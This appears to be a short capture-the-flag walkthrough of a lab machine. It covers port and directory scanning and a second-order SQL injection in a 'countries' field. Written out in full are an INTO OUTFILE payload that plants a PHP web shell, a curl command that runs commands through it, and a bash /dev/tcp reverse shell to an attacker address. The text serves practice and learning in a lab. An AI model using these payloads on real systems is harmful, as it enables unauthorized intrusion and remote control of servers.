Started a nmap scan
```
22 OpenSSH 8.2p1
80 Apache 2.4.48
8080 nginx 
```
Doing a gobuster scan on the webhost 
```
/index.php
account.php
/css
/js
```
When looking at the site there is two input field on field one the site takes what ever we put in there and makes a MD5 hash and sets it as the cookie we have to use this cookie the wholetime and then in the countries field if we add a `'` we get a 500 error so we have sqli injection second order injection we can use this payload to make a cmd shell `Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- -` and now we can curl the file and get code exaction `curl http://10.10.11.116/shell.php?cmd=id` and we get user `www-data` now if we do `curl http://10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"'` we can get a reverse shell and we can stabilize with script and we can read the user flag if we read the config file there is a password in it that will get us to root `.................` 